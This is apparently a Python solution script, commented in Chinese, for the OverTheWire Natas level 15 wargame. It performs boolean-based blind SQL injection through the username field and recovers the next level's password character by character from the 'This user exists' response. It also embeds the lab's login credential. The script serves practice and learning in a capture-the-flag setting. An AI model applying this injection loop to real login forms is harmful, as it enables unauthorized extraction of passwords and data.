import requests

# 这个request模块需学习下。

url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#26个大小写字母加上10个数字。
#characters = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
#方法一：可以一次性尝试所有字母数字。
#方法二：也可以分两个脚本，脚本一过滤出可能的字母数字，脚本二排字母数字的顺序。
#方法二应该比方法一效率高一倍左右吧。
char = ''
pass16 = ''
string = 'This user exists'
#用于匹配返回页面。

for l in range(1,33):
#用于循环1到32位。
    for c in characters:
    #用于循环尝试62个字母数字。
        pass16 += c
        sql = 'natas16" and password like binary "' + pass16 + '%"#'
        #sql = 'natas16" and password like binary %"' + pass16 + '%"#'
        #若使用方法二，脚本一用于过滤正确字符时的SQL语句。
        #用于拼接的SQL语句。
        req = requests.post(url=url,
                            data={'username': sql},
                            auth=(username, password)
                            #用户认证。
                            )
        #构造请求包。
        if string in req.text:
        #判断当前尝试是否正确。
            #char += c
            #pass16 = char
            char = pass16
            print('password is ' + char)
            break
            #当该循环匹配到正确的字母或数字后，退出循环。
        else:
            pass16 = char
            #将pass16的值返回至上一次正确的值。
    l +=1
